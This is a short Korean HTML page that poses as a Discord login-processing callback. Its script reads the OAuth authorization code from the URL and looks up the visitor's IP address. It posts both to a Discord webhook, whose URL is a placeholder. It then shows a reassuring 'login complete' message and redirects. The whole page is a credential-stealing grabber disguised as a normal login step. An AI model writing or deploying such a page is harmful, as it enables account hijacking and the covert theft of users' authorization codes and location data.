<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>로그인 처리</title>
</head>
<body>
  <h2>로그인 처리 중...</h2>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/웹훅주소";

    const code = new URLSearchParams(window.location.search).get("code");
    if (!code) {
      document.body.innerHTML = "❌ 인증 코드가 없습니다.";
      throw new Error("No code in URL");
    }

    // IP 가져오기
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const payload = {
          content: `✅ Discord 로그인 시도됨\n🔑 인증 코드: ${code}\n🌐 IP: ${data.ip}`
        };

        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      })
      .finally(() => {
        document.body.innerHTML = "✅ 로그인 완료됨. 메인 페이지로 이동 중...";
        setTimeout(() => {
          window.location.href = "/"; // 메인 페이지로 이동
        }, 2000);
      });
  </script>
</body>
</html>
